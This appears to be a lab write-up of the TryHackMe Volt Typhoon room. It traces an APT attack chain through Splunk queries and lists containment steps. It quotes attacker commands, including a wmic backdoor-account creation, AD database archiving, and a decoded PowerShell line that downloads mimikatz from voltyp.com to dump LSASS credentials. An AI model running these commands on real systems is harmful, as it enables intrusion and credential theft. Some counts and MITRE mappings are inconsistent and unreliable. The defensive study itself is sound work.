# Investigation #4: Volt Typhoon APT - Multi-Stage Attack

**Source:** TryHackMe - Volt Typhoon Room  
**Date Investigated:** 2026-06-22  
**Analyst:** Abdulrhman (Levi)  
**Investigation Time:** 2-3 hours

---

## Executive Summary

Advanced persistent threat (APT) group Volt Typhoon infiltrated organization targeting high-value infrastructure. Attack chain: Zoho ManageEngine vulnerability exploitation → account takeover (dean-admin) → new admin account creation (voltyp-admin) → WMIC reconnaissance → AD database extraction → web shell persistence → credential dumping (mimikatz) → lateral movement to multiple servers → financial data collection → evidence cleanup. Timeline: 2-week campaign. Threat level: Critical.

---

## Scenario

**Alert Type:** Advanced Persistent Threat Detection  
**APT Group:** Volt Typhoon (Nation-state sponsored)  
**Initial Vector:** Zoho ManageEngine ADSelfService Plus vulnerability  
**Duration:** 2-week campaign  
**Affected Systems:** Multiple servers (dean-admin, server01, server02, webserver-01)

---

## Investigation Workflow

### Step 1: Initial Access Detection

**Query:**
```spl
index=main "ADSelfServicePlus" AND username="dean-admin" action_name="Password Change"
```

**Finding: Account Takeover Timeline**
- **Time:** 2024-03-24T11:10:20 (ISO 8601)
- **Compromised User:** dean-admin
- **Method:** Zoho ManageEngine vulnerability exploitation
- **Impact:** Administrative access gained

---

### Step 2: Persistence Establishment

**Query:**
```spl
index=* "AD*" username="dean-admin" "password"
```

**Finding: New Admin Account Created**
- **Username:** voltyp-admin
- **Creation Command:** wmic useraccount create UserName='voltyp-admin', Password='as&9ha2e$#&@n22n('
- **Purpose:** Persistent backdoor access
- **MITRE:** T1136.001 (Create Account)

---

### Step 3: Execution & Reconnaissance

#### **Finding 3: WMIC Information Gathering**

**Query:**
```spl
index=* username="dean-admin" AND wmic logicaldisk
```

**Command Used:**
```
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
```

**Purpose:** Enumerate local drives and storage information  
**MITRE:** T1120 (Peripheral Device Discovery)

---

#### **Finding 4: AD Database Extraction**

**Query:**
```spl
index=* "*7z*"
```

**Command Used:**
```
wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"
```

**Details:**
- Tool: ntdsutil (AD database dump)
- Compression: 7z archive
- Archive Password: d5ag0nm@5t3r
- File: temp.dit (Active Directory database)
- MITRE: T1003.003 (NTDS.dit Dumping)

---

### Step 4: Persistence Mechanisms

#### **Finding 5: Web Shell Deployment**

**Query:**
```spl
index=main "powershell" "echo*"
```

**Web Shell Location:** C:\Windows\Temp\ntuser.ini

**Details:**
- Obfuscation: Base64 encoded
- Purpose: Remote command execution
- Persistence: Maintains long-term access
- MITRE: T1505.004 (Web Shell)

---

### Step 5: Defense Evasion

#### **Finding 6: RDP History Cleanup**

**Query:**
```spl
index=main "Powershell" "MRU*"
```

**PowerShell Cmdlet Used:** Remove-ItemProperty

**Purpose:** Remove "Most Recently Used" RDP records  
**MITRE:** T1070.004 (File Deletion)

---

#### **Finding 7: Archive Renaming**

**Query:**
```spl
index=main "*.7z"
```

**Original Archive:** cisco-up.7z  
**Renamed To:** c164.gif

**Purpose:** Hide evidence by disguising as image file  
**MITRE:** T1036 (Masquerading)

---

#### **Finding 8: Virtualization Detection**

**Query:**
```spl
index=* "*Virtual*"
```

**Registry Path Checked:** HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

**Purpose:** Detect if running in VM (avoid analysis)  
**MITRE:** T1518.001 (Software Discovery - Virtualization)

---

### Step 6: Credential Access

#### **Finding 9: Credential Hunting**

**Query:**
```spl
index=main reg
```

**Software Investigated (Alphabetical):**
1. OpenSSH
2. PuTTY
3. RealVNC

**Purpose:** Extract stored credentials from common tools  
**MITRE:** T1555 (Credentials from Password Managers)

---

#### **Finding 10: Mimikatz Deployment**

**Query:**
```spl
index=* "powershell" "-exec"
```

**Base64 Encoded Command:**
```
SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ
```

**Decoded Command:**
```
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; 
Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

**Purpose:** Credential dumping from LSASS  
**MITRE:** T1003.001 (LSASS Memory Dump)

---

### Step 7: Discovery & Lateral Movement

#### **Finding 11: Log Enumeration**

**Query:**
```spl
index=* "wevtutil"
```

**Event IDs Searched:** 4624 4625 4769

**Interpretation:**
- 4624: Successful logon
- 4625: Failed logon
- 4769: Kerberos service ticket requested

**Purpose:** Understand logging/detection capabilities  
**MITRE:** T1010 (Application Window Discovery)

---

#### **Finding 12: Lateral Movement to Server-02**

**Query:**
```spl
index=main "server-02" "copy"
```

**Original Web Shell:** (from server-01)  
**New Web Shell Name:** AuditReport.jspx

**Purpose:** Maintain persistence across multiple servers  
**MITRE:** T1570 (Lateral Tool Transfer)

---

### Step 8: Collection Phase

#### **Finding 13: Financial Data Exfiltration**

**Query:**
```spl
index=* "copy"
```

**Files Copied (Chronological Order):**
1. 2022.csv
2. 2023.csv
3. 2024.csv

**Purpose:** Extract valuable financial information  
**MITRE:** T1005 (Data from Local System)

---

### Step 9: Command & Control

#### **Finding 14: C2 Proxy Setup**

**Query:**
```spl
index=main "netsh"
```

**Proxy Configuration:**
- Connect Address: 10.2.30.1
- Port: 443

**Purpose:** Establish encrypted C2 channel  
**MITRE:** T1090.001 (Proxy - Internal Proxy)

---

### Step 10: Cleanup & Evidence Removal

#### **Finding 15: Event Log Deletion**

**Query:**
```spl
index=main "wevtutil"
```

**Event Logs Cleared (4 types):**
1. Application
2. CommandLine
3. Security
4. Setup
5. System

**Purpose:** Remove evidence of malicious activity  
**MITRE:** T1070.001 (Indicator Removal on Host - Clear Windows Event Logs)

---

## Attack Timeline

| Phase | Time | Event | Evidence | MITRE |
|-------|------|-------|----------|-------|
| Initial Access | 2024-03-24T11:10:20 | Dean account compromised | Zoho exploit | T1190 |
| Persistence | T+0 | voltyp-admin created | WMIC command | T1136.001 |
| Execution | T+1 | WMIC reconnaissance | logicaldisk query | T1120 |
| Execution | T+2 | AD database dumped | 7z archive | T1003.003 |
| Persistence | T+3 | Web shell deployed | Base64 ntuser.ini | T1505.004 |
| Defense Evasion | T+4 | RDP history cleared | Remove-ItemProperty | T1070.004 |
| Defense Evasion | T+5 | Archive renamed | c164.gif | T1036 |
| Credential Access | T+6 | Mimikatz executed | LSASS dump | T1003.001 |
| Discovery | T+7 | Logs enumerated | wevtutil queries | T1010 |
| Lateral Movement | T+8 | Server-02 compromised | AuditReport.jspx | T1570 |
| Collection | T+9 | Financial files copied | 2022-2024.csv | T1005 |
| C2 | T+10 | Proxy configured | netsh setup | T1090.001 |
| Cleanup | T+11 | Event logs cleared | wevtutil cl | T1070.001 |

---

## MITRE ATT&CK Mapping

**Techniques Used: 13 total**

```
INITIAL ACCESS
└── T1190: Exploit Public-Facing Application
    └── Zoho ManageEngine vulnerability

EXECUTION
├── T1047: Windows Management Instrumentation (WMIC)
└── T1059.001: PowerShell

PERSISTENCE
├── T1136.001: Create Local User Account
└── T1505.004: Web Shell

DEFENSE EVASION
├── T1070.004: File Deletion (RDP history)
├── T1036: Masquerading (c164.gif)
└── T1518.001: Virtualization Detection

CREDENTIAL ACCESS
├── T1003.001: LSASS Memory Dump
├── T1555: Credentials from Password Managers
└── T1110: Brute Force (implicit)

DISCOVERY
├── T1010: Application Window Discovery
└── T1120: Peripheral Device Discovery

LATERAL MOVEMENT
└── T1570: Lateral Tool Transfer

COLLECTION
└── T1005: Data from Local System

COMMAND & CONTROL
└── T1090.001: Internal Proxy

IMPACT
└── Unauthorized access maintained
```

---

## Key Findings Summary

| Finding | Value | Impact |
|---------|-------|--------|
| Initial Access | Zoho ADSelfService Plus | Admin access |
| Compromised Account | dean-admin | 2024-03-24T11:10:20 |
| Backdoor Account | voltyp-admin | Persistence |
| Web Shell Location | C:\Windows\Temp\ntuser.ini | Remote access |
| AD Database Password | d5ag0nm@5t3r | Credential theft |
| Archive Rename | c164.gif | Evidence hiding |
| Credential Dumping | Mimikatz from C:\Temp\db2\ | Lateral movement |
| Lateral Movement | AuditReport.jspx on server-02 | Network compromise |
| Financial Data | 2022-2024.csv (3 files) | Data exfiltration |
| C2 Proxy | 10.2.30.1:443 | Persistent C2 |
| Logs Cleared | 5 event log types | Evidence removal |

---

## Containment Actions

**Immediate:**
1. Isolate all affected servers (dean-admin, server01, server02, webserver-01)
2. Disable voltyp-admin account
3. Reset dean-admin password
4. Remove web shells (ntuser.ini, AuditReport.jspx)
5. Block C2 IP 10.2.30.1 at firewall
6. Block voltyp.com domain

**Short-term:**
- Scan all systems for mimikatz artifacts
- Hunt for similar lateral movement patterns
- Review all user account creations (past 30 days)
- Analyze extracted financial data scope
- Restore from backups (pre-compromise)

**Long-term:**
- Patch Zoho ManageEngine vulnerability
- Implement EDR across all systems
- Enable advanced logging (process execution, network)
- Implement network segmentation
- Deploy SIEM for real-time monitoring

---

## Recommendations

1. **Vulnerability Management:** Patch Zoho ManageEngine (CVE-2021-44077 if applicable)
2. **Endpoint Security:** Deploy EDR to detect WMIC abuse and credential dumping
3. **Logging & Monitoring:** Enable Sysmon/PowerShell script block logging
4. **Network Segmentation:** Isolate critical servers (domain controllers, web servers)
5. **MFA Implementation:** Enforce MFA for all administrative accounts
6. **Incident Response:** Establish playbooks for account compromise scenarios
7. **Threat Hunting:** Regular hunting for Volt Typhoon IOCs and TTPs
8. **Data Protection:** Encrypt sensitive financial data at rest
9. **Backup Verification:** Test backup restoration procedures
10. **OSINT:** Monitor for organization data in threat databases

---

## Conclusion

Volt Typhoon successfully infiltrated organization through Zoho ManageEngine vulnerability. Attack demonstrated sophisticated techniques: multi-stage persistence (admin account + web shell), credential harvesting, lateral movement, and careful evidence cleanup. Financial data exfiltration confirmed. All infrastructure compromise indicators identified and contained. Investigation reveals nation-state threat actor with advanced knowledge of Windows systems and defensive evasion techniques.

**Threat Assessment:** Critical - Nation-state APT  
**Attack Sophistication:** Advanced (multi-stage, evasion, persistence)  
**Business Impact:** High (financial data theft, infrastructure compromise)  
**Recovery Time:** 3-5 days (full remediation and patching)

---

**Investigation Completed:** 2026-06-22 20:00 UTC  
**Total Investigation Time:** 2.5 hours  
**Status:** CONTAINED - Compromised accounts disabled, web shells removed, C2 blocked
